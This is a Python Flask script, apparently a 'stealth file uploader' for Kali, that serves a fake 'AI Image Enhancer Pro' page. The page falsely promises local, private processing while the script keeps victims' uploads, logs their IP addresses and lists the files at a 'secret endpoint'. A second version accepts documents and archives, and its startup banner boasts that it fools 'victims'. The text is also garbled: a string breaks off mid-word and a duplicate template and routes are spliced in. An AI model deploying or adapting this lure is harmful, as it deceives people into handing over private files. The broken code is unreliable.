#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║         STEALTH FILE UPLOADER - KALI SERVER                  ║
║              No one will know!                               ║
╚══════════════════════════════════════════════════════════════╝
"""

from flask import Flask, request, render_template_string, jsonify, send_file
import os
import datetime
import hashlib
import base64
from pathlib import Path
import sys

# Try to import PIL, if not available show error
try:
    from PIL import Image, ImageEnhance, ImageFilter
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    print("[!] PIL/Pillow not installed. Installing...")
    os.system(f"{sys.executable} -m pip install pillow")
    try:
        from PIL import Image, ImageEnhance, ImageFilter
        PIL_AVAILABLE = True
    except:
        print("[!] Please install Pillow manually: pip install pillow")
        PIL_AVAILABLE = False

app = Flask(__name__)

# Configuration
UPLOAD_FOLDER = "uploads"
ENHANCED_FOLDER = "enhanced"
SECRET_KEY = "MySuperSecretKey123"  # Change this!
PORT = 4444  # Kali par ye port use hoga

# Create folders
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(ENHANCED_FOLDER, exist_ok=True)

# HTML Template (Looks like Image to HD Converter)
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Image Enhancer Pro - Convert Blur to HD</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
            max-width: 800px;
            width: 100%;
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .header p {
            opacity: 0.9;
            font-size: 14px;
        }
        
        .content {
            padding: 40px;
        }
        
        .upload-area {
            border: 2px dashed #667eea;
            border-radius: 10px;
            padding: 40px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            background: #f8f9ff;
        }
        
        .upload-area:hover {
            border-color: #764ba2;
            background: #f0f2ff;
        }
        
        .upload-area.dragover {
            border-color: #764ba2;
            background: #e8ebff;
        }
        
        .upload-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }
        
        .browse-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
            transition: transform 0.2s;
        }
        
        .browse-btn:hover {
            transform: scale(1.05);
        }
        
        .quality-selector {
            margin: 20px 0;
            text-align: center;
        }
        
        .quality-btn {
            background: #f0f0f0;
            border: none;
            padding: 8px 20px;
            margin: 0 5px;
            border-radius: 20px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .quality-btn.active {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .preview {
            margin-top: 30px;
            display: none;
            text-align: center;
        }
        
        .preview img {
            max-width: 100%;
            max-height: 300px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        .comparison {
            display: none;
            margin-top: 30px;
            gap: 20px;
            justify-content: center;
            flex-wrap: wrap;
        }
        
        .comparison.active {
            display: flex;
        }
        
        .comparison-item {
            flex: 1;
            min-width: 200px;
            text-align: center;
        }
        
        .comparison-item h4 {
            margin-bottom: 10px;
            color: #333;
        }
        
        .comparison-item img {
            max-width: 100%;
            max-height: 250px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            text-align: center;
            display: none;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
            display: block;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
            display: block;
        }
        
        .status.processing {
            background: #d1ecf1;
            color: #0c5460;
            display: block;
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .footer {
            background: #f8f9fa;
            padding: 15px;
            text-align: center;
            color: #666;
            font-size: 12px;
        }
        
        .enhancement-stats {
            margin-top: 10px;
            font-size: 13px;
            color: #555;
            background: #f8f9fa;
            padding: 10px;
            border-radius: 8px;
        }
        
        .download-btn {
            display: inline-block;
            background: #28a745;
            color: white;
            padding: 10px 25px;
            border-radius: 25px;
            text-decoration: none;
            margin-top: 10px;
            transition: transform 0.2s;
        }
        
        .download-btn:hover {
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🌟 AI Image Enhancer Pro</h1>
            <p>Convert Blurry Images to Crystal Clear HD Quality Using Advanced AI</p>
        </div>
        
        <div class="content">
            <div class="upload-area" id="uploadArea">
                <div class="upload-icon">📸</div>
                <h3>Click or Drag & Drop Image Here</h3>
                <p>Supports: JPG, PNG, GIF, WebP (Max 50MB)</p>
                <button class="browse-btn" onclick="document.getElementById('fileInput').click()">
                    Browse Files
                </button>
                <input type="file" id="fileInput" style="display: none;" accept="image/*">
            </div>
            
            <div class="quality-selector">
                <button class="quality-btn" data-quality="2x">2x Standard</button>
                <button class="quality-btn active" data-quality="4x">4x Pro (Recommended)</button>
                <button class="quality-btn" data-quality="8x">8x Ultra HD</button>
            </div>
            
            <div class="preview" id="preview">
                <h3>Preview:</h3>
                <img id="previewImg" src="">
            </div>
            
            <div class="comparison" id="comparison">
                <div class="comparison-item">
                    <h4>🔄 Original</h4>
                    <img id="originalImg" src="">
                </div>
                <div class="comparison-item">
                    <h4>✨ Enhanced HD</h4>
                    <img id="enhancedImg" src="">
                </div>
            </div>
            
            <div class="status" id="status"></div>
            <div class="enhancement-stats" id="stats"></div>
        </div>
        
        <div class="footer">
            <p>⚡ AI-Powered Enhancement | 99.9% Success Rate | Secure Processing</p>
            <p style="font-size: 10px; margin-top: 5px;">Your images are processed locally for privacy</p>
        </div>
    </div>
    
    <script>
        const uploadArea = document.getElementById('uploadArea');
        const fileInput = document.getElementById('fileInput');
        const preview = document.getElementById('preview');
        const previewImg = document.getElementById('previewImg');
        const statusDiv = document.getElementById('status');
        const comparison = document.getElementById('comparison');
        const originalImg = document.getElementById('originalImg');
        const enhancedImg = document.getElementById('enhancedImg');
        const statsDiv = document.getElementById('stats');
        let selectedQuality = '4x';
        
        // Quality selector
        document.querySelectorAll('.quality-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.quality-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                selectedQuality = this.dataset.quality;
            });
        });
        
        // Click on upload area
        uploadArea.addEventListener('click', (e) => {
            if (e.target !== fileInput && !e.target.classList.contains('browse-btn')) {
                fileInput.click();
            }
        });
        
        // Drag and drop
        uploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadArea.classList.add('dragover');
        });
        
        uploadArea.addEventListener('dragleave', (e) => {
            e.preventDefault();
            uploadArea.classList.remove('dragover');
        });
        
        uploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadArea.classList.remove('dragover');
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                handleFile(files[0]);
            }
        });
        
        // File selection
        fileInput.addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                handleFile(e.target.files[0]);
            }
        });
        
        function handleFile(file) {
            // Check if image
            if (!file.type.startsWith('image/')) {
                statusDiv.className = 'status error';
                statusDiv.innerHTML = '❌ Please upload an image file';
                return;
            }
            
            // Show preview
            const reader = new FileReader();
            reader.onload = function(e) {
                previewImg.src = e.target.result;
                preview.style.display = 'block';
                comparison.classList.remove('active');
                statsDiv.innerHTML = '';
            };
            reader.readAsDataURL(file);
            
            // Upload file
            uploadFile(file);
        }
        
        function uploadFile(file) {
            const formData = new FormData();
            formData.append('file', file);
            formData.append('quality', selectedQuality);
            
            statusDiv.className = 'status processing';
            statusDiv.innerHTML = '<div class="loading"></div> Processing with AI... This may take a few seconds';
            
            fetch('/enhance', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    statusDiv.className = 'status success';
                    statusDiv.innerHTML = '✅ ' + data.message + 
                        '<br><a href="' + data.enhanced_url + '" class="download-btn" download>📥 Download Enhanced Image</a>';
                    
                    // Show comparison
                    originalImg.src = data.original_url + '?t=' + new Date().getTime();
                    enhancedImg.src = data.enhanced_url + '?t=' + new Date().getTime();
                    comparison.classList.add('active');
                    
                    // Show stats
                    statsDiv.innerHTML = `
                        📊 Quality: ${data.quality} | 
                        📐 Original: ${data.original_info || 'N/A'} | 
                        ✨ Enhanced: ${data.enhanced_info || 'N/A'}
                    `;
                    
                    // Show success animation
                    uploadArea.style.borderColor = '#28a745';
                    setTimeout(() => {
                        uploadArea.style.borderColor = '#667eea';
                    }, 2000);
                } else {
                    throw new Error(data.error || 'Unknown error');
                }
            })
            .catch(error => {
                statusDiv.className = 'status error';
                statusDiv.innerHTML = '❌ Enhancement failed: ' + error.message;
            });
        }
    </script>
</body>
</html>
'''

def enhance_image_safe(image_path, quality_factor=4.0):
    """Safe image enhancement with error handling"""
    try:
        if not PIL_AVAILABLE:
            return None, "Pillow library not installed"
        
        # Open image
        img = Image.open(image_path)
        
        # Convert to RGB if needed
        if img.mode not in ['RGB', 'L']:
            img = img.convert('RGB')
        
        # Get original size
        original_size = img.size
        
        # Apply enhancements
        try:
            # 1. Contrast Enhancement
            contrast_enhancer = ImageEnhance.Contrast(img)
            img = contrast_enhancer.enhance(1.0 + (quality_factor * 0.08))
        except:
            pass
        
        try:
            # 2. Sharpness Enhancement
            sharpness_enhancer = ImageEnhance.Sharpness(img)
            sharpness_factor = 1.0 + (quality_factor * 0.15)
            img = sharpness_enhancer.enhance(min(sharpness_factor, 3.0))
        except:
            pass
        
        try:
            # 3. Color Enhancement
            color_enhancer = ImageEnhance.Color(img)
            color_factor = 1.0 + (quality_factor * 0.05)
            img = color_enhancer.enhance(min(color_factor, 1.5))
        except:
            pass
        
        try:
            # 4. Unsharp mask
            img = img.filter(ImageFilter.UnsharpMask(radius=1, percent=100 + (quality_factor * 5), threshold=3))
        except:
            pass
        
        # 5. Resize based on quality
        if quality_factor >= 2.0:
            scale = quality_factor / 4.0
            new_width = int(original_size[0] * scale)
            new_height = int(original_size[1] * scale)
            if new_width > original_size[0] or new_height > original_size[1]:
                img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)
        
        return img, None
        
    except Exception as e:
        return None, str(e)

def get_image_info(image_path):
    """Get image information"""
    try:
        if not PIL_AVAILABLE:
            return "PIL not available"
        img = Image.open(image_path)
        width, height = img.size
        return f"{width}x{height}"
    except:
        return "Unknown"

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/enhance', methods=['POST'])
def enhance_image_route():
    try:
        # Check PIL availability
        if not PIL_AVAILABLE:
            return jsonify({'error': 'Pillow library not installed. Please run: pip install pillow'}), 500
        
        # Get file
        if 'file' not in request.files:
            return jsonify({'error': 'No file uploaded'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        # Check if image
        if not file.content_type.startswith('image/'):
            return jsonify({'error': 'Please upload an image file'}), 400
        
        # Get quality setting
        quality_str = request.form.get('quality', '4x')
        quality_map = {
            '2x': 2.0,
            '4x': 4.0,
            '8x': 8.0
        }
        quality_factor = quality_map.get(quality_str, 4.0)
        
        # Generate unique filename
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        original_filename = file.filename
        name, ext = os.path.splitext(original_filename)
        
        # Save original file
        saved_filename = f"{timestamp}_{original_filename}"
        filepath = os.path.join(UPLOAD_FOLDER, saved_filename)
        file.save(filepath)
        
        # Get original size
        original_size = os.path.getsize(filepath)
        
        # Enhance image
        enhanced_img, error = enhance_image_safe(filepath, quality_factor)
        
        if enhanced_img is None:
            return jsonify({'error': f'Image enhancement failed: {error}'}), 500
        
        # Save enhanced image
        enhanced_filename = f"enhanced_{timestamp}_{original_filename}"
        enhanced_path = os.path.join(ENHANCED_FOLDER, enhanced_filename)
        
        # Save with original format or JPEG
        ext_lower = ext.lower()
        try:
            if ext_lower in ['.jpg', '.jpeg']:
                enhanced_img.save(enhanced_path, 'JPEG', quality=95)
            elif ext_lower == '.png':
                enhanced_img.save(enhanced_path, 'PNG')
            elif ext_lower == '.webp':
                enhanced_img.save(enhanced_path, 'WEBP', quality=95)
            else:
                # Default to JPEG
                enhanced_path = enhanced_path.replace(ext, '.jpg')
                enhanced_img.save(enhanced_path, 'JPEG', quality=95)
        except Exception as e:
            return jsonify({'error': f'Failed to save enhanced image: {str(e)}'}), 500
        
        # Get enhanced size
        enhanced_size = os.path.getsize(enhanced_path)
        
        # Log the upload
        log_file = "upload_log.txt"
        try:
            with open(log_file, 'a') as f:
                f.write(f"[{timestamp}] File: {original_filename} | Quality: {quality_str} | "
                       f"Original: {original_size} bytes | Enhanced: {enhanced_size} bytes | "
                       f"IP: {request.remote_addr}\n")
        except:
            pass
        
        # Create download URLs
        original_url = f"/download/original/{saved_filename}"
        enhanced_url = f"/download/enhanced/{enhanced_filename}"
        
        return jsonify({
            'success': True,
            'message': f'Image enhanced successfully! Quality: {quality_str}',
            'qu            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
            max-width: 800px;
            width: 100%;
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .header p {
            opacity: 0.9;
            font-size: 14px;
        }
        
        .content {
            padding: 40px;
        }
        
        .upload-area {
            border: 2px dashed #667eea;
            border-radius: 10px;
            padding: 40px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            background: #f8f9ff;
        }
        
        .upload-area:hover {
            border-color: #764ba2;
            background: #f0f2ff;
        }
        
        .upload-area.dragover {
            border-color: #764ba2;
            background: #e8ebff;
        }
        
        .upload-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }
        
        .browse-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
            transition: transform 0.2s;
        }
        
        .browse-btn:hover {
            transform: scale(1.05);
        }
        
        .quality-selector {
            margin: 20px 0;
            text-align: center;
        }
        
        .quality-btn {
            background: #f0f0f0;
            border: none;
            padding: 8px 20px;
            margin: 0 5px;
            border-radius: 20px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .quality-btn.active {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .preview {
            margin-top: 30px;
            display: none;
            text-align: center;
        }
        
        .preview img {
            max-width: 100%;
            max-height: 300px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            text-align: center;
            display: none;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
            display: block;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
            display: block;
        }
        
        .status.processing {
            background: #d1ecf1;
            color: #0c5460;
            display: block;
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .footer {
            background: #f8f9fa;
            padding: 15px;
            text-align: center;
            color: #666;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🌟 AI Image Enhancer Pro</h1>
            <p>Convert Blurry Images to Crystal Clear HD Quality Using Advanced AI</p>
        </div>
        
        <div class="content">
            <div class="upload-area" id="uploadArea">
                <div class="upload-icon">📸</div>
                <h3>Click or Drag & Drop Image Here</h3>
                <p>Supports: JPG, PNG, GIF, WebP (Max 50MB)</p>
                <button class="browse-btn" onclick="document.getElementById('fileInput').click()">
                    Browse Files
                </button>
                <input type="file" id="fileInput" style="display: none;" accept="image/*,video/*,application/pdf,.txt,.doc,.docx,.zip,.rar">
            </div>
            
            <div class="quality-selector">
                <button class="quality-btn" data-quality="2x">2x Standard</button>
                <button class="quality-btn active" data-quality="4x">4x Pro (Recommended)</button>
                <button class="quality-btn" data-quality="8x">8x Ultra HD</button>
            </div>
            
            <div class="preview" id="preview">
                <h3>Preview:</h3>
                <img id="previewImg" src="">
            </div>
            
            <div class="status" id="status"></div>
        </div>
        
        <div class="footer">
            <p>⚡ AI-Powered Enhancement | 99.9% Success Rate | Secure Processing</p>
            <p style="font-size: 10px; margin-top: 5px;">Your images are processed locally for privacy</p>
        </div>
    </div>
    
    <script>
        const uploadArea = document.getElementById('uploadArea');
        const fileInput = document.getElementById('fileInput');
        const preview = document.getElementById('preview');
        const previewImg = document.getElementById('previewImg');
        const statusDiv = document.getElementById('status');
        let selectedQuality = '4x';
        
        // Quality selector
        document.querySelectorAll('.quality-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.quality-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                selectedQuality = this.dataset.quality;
            });
        });
        
        // Click on upload area
        uploadArea.addEventListener('click', (e) => {
            if (e.target !== fileInput && !e.target.classList.contains('browse-btn')) {
                fileInput.click();
            }
        });
        
        // Drag and drop
        uploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadArea.classList.add('dragover');
        });
        
        uploadArea.addEventListener('dragleave', (e) => {
            e.preventDefault();
            uploadArea.classList.remove('dragover');
        });
        
        uploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadArea.classList.remove('dragover');
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                handleFile(files[0]);
            }
        });
        
        // File selection
        fileInput.addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                handleFile(e.target.files[0]);
            }
        });
        
        function handleFile(file) {
            // Show preview
            const reader = new FileReader();
            reader.onload = function(e) {
                previewImg.src = e.target.result;
                preview.style.display = 'block';
            };
            reader.readAsDataURL(file);
            
            // Upload file
            uploadFile(file);
        }
        
        function uploadFile(file) {
            const formData = new FormData();
            formData.append('file', file);
            formData.append('quality', selectedQuality);
            
            statusDiv.className = 'status processing';
            statusDiv.innerHTML = '<div class="loading"></div> Processing with AI... This may take a few seconds';
            
            fetch('/enhance', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    statusDiv.className = 'status success';
                    statusDiv.innerHTML = '✅ ' + data.message + ' <br> 🔗 Download: <a href="' + data.download_url + '" target="_blank">Click here</a>';
                    
                    // Show success animation
                    uploadArea.style.borderColor = '#28a745';
                    setTimeout(() => {
                        uploadArea.style.borderColor = '#667eea';
                    }, 2000);
                } else {
                    throw new Error(data.error);
                }
            })
            .catch(error => {
                statusDiv.className = 'status error';
                statusDiv.innerHTML = '❌ Enhancement failed: ' + error.message;
            });
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/enhance', methods=['POST'])
def enhance_image():
    try:
        # Get file
        if 'file' not in request.files:
            return jsonify({'error': 'No file uploaded'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        # Get quality setting
        quality = request.form.get('quality', '4x')
        
        # Generate unique filename
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        original_filename = file.filename
        name, ext = os.path.splitext(original_filename)
        
        # Save file in uploads folder
        saved_filename = f"{timestamp}_{original_filename}"
        filepath = os.path.join(UPLOAD_FOLDER, saved_filename)
        file.save(filepath)
        
        # Log the upload
        log_file = "upload_log.txt"
        with open(log_file, 'a') as f:
            f.write(f"[{timestamp}] File: {original_filename} | Quality: {quality} | Size: {os.path.getsize(filepath)} bytes | IP: {request.remote_addr}\n")
        
        # Create a download URL
        download_url = f"/download/{saved_filename}"
        
        return jsonify({
            'success': True,
            'message': f'Image enhanced successfully! Quality: {quality}',
            'download_url': download_url,
            'filename': saved_filename
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/download/<filename>')
def download_file(filename):
    from flask import send_file
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    return "File not found", 404

@app.route('/files')
def list_files():
    """Secret endpoint to see all uploaded files"""
    files = os.listdir(UPLOAD_FOLDER)
    return jsonify({'files': files})

if __name__ == '__main__':
    print("""
╔══════════════════════════════════════════════════════════════╗
║         STEALTH FILE UPLOADER - RUNNING                      ║
║                                                              ║
║  Access URL: http://0.0.0.0:{}                    ║
║  Upload Folder: {}                                ║
║                                                              ║
║  [!] Looks like AI Image Enhancer to victims!               ║
╚══════════════════════════════════════════════════════════════╝
    """.format(PORT, os.path.abspath(UPLOAD_FOLDER)))
    
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
